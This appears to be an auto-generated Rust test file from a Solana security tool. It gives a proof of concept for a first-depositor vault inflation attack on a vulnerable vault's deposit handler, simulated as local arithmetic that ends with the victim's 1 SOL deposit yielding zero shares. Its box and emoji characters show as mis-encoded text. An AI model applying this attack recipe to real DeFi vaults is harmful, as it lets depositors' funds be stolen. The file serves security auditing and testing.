//! Auto-generated Exploit PoC by Solana Security Swarm
//! Finding: SOL-019 â€” First-Depositor Vault Inflation Attack
//! Target: handle_deposit (vulnerable-vault)
//! Estimated Profit: 1.0 SOL per victim deposit
//!
//! Attack: Deposit 1 lamport â†’ inflate vault via direct transfer â†’
//! victim's shares truncate to 0 â†’ attacker withdraws everything.

use solana_program::pubkey::Pubkey;
use std::str::FromStr;

#[test]
fn test_exploit_first_depositor_inflation() {
    println!("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
    println!("â•‘  SOL-019: First-Depositor Vault Inflation PoC   â•‘");
    println!("â•‘  Target: vulnerable_vault::handle_deposit        â•‘");
    println!("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!();

    let program_id = Pubkey::from_str("47poGSxjXsErkcCrZqEJtomHrdxHtfAbpfYmx3xRndVJ").unwrap();
    println!("Program ID: {}", program_id);
    println!();

    // Simulated vault state
    let mut vault_total_shares: u64 = 0;
    let mut vault_total_assets: u64 = 0;

    let attacker_initial: u64 = 2_000_000_000;
    let mut attacker_balance: u64 = attacker_initial;
    let mut attacker_shares: u64 = 0;

    let victim_deposit: u64 = 1_000_000_000; // 1 SOL

    // Step 1: Attacker deposits 1 lamport (no MIN_FIRST_DEPOSIT guard)
    let deposit = 1u64;
    let shares = if vault_total_shares == 0 { deposit } else {
        deposit * vault_total_shares / vault_total_assets
    };
    attacker_shares += shares;
    vault_total_shares += shares;
    vault_total_assets += deposit;
    attacker_balance -= deposit;

    println!("[STEP 1] Attacker deposits {} lamport", deposit);
    println!("         Shares minted: {}", shares);
    println!("         Vault: assets={} shares={}", vault_total_assets, vault_total_shares);
    println!();

    // Step 2: Attacker inflates vault via direct SPL transfer
    let inflation = 1_000_000_000u64;
    vault_total_assets += inflation;
    attacker_balance -= inflation;

    println!("[STEP 2] Direct transfer {} lamports to vault token account", inflation);
    println!("         Share price: {} lamports/share", vault_total_assets / vault_total_shares);
    println!();

    // Step 3: Victim deposits â€” integer truncation â†’ 0 shares
    let victim_shares = if vault_total_shares == 0 { victim_deposit } else {
        victim_deposit * vault_total_shares / vault_total_assets
    };
    vault_total_shares += victim_shares;
    vault_total_assets += victim_deposit;

    println!("[STEP 3] Victim deposits {} lamports â†’ {} shares (truncated!)",
        victim_deposit, victim_shares);
    println!();

    // Step 4: Attacker withdraws
    let withdraw = attacker_shares * vault_total_assets / vault_total_shares;
    let _final_shares = vault_total_shares - attacker_shares;
    let _final_assets = vault_total_assets - withdraw;
    attacker_balance += withdraw;

    let profit = attacker_balance as i64 - attacker_initial as i64;

    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!("{} EXPLOIT: First-Depositor Inflation", if profit > 0 { "âœ…" } else { "âŒ" });
    println!("ðŸ’° Profit: {} lamports ({:.4} SOL)", profit, profit as f64 / 1e9);
    println!("ðŸŽ¯ Victim lost: {} lamports", victim_deposit);
    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");

    assert!(profit > 0, "Exploit must be profitable");
    assert_eq!(victim_shares, 0, "Victim must get 0 shares");
}
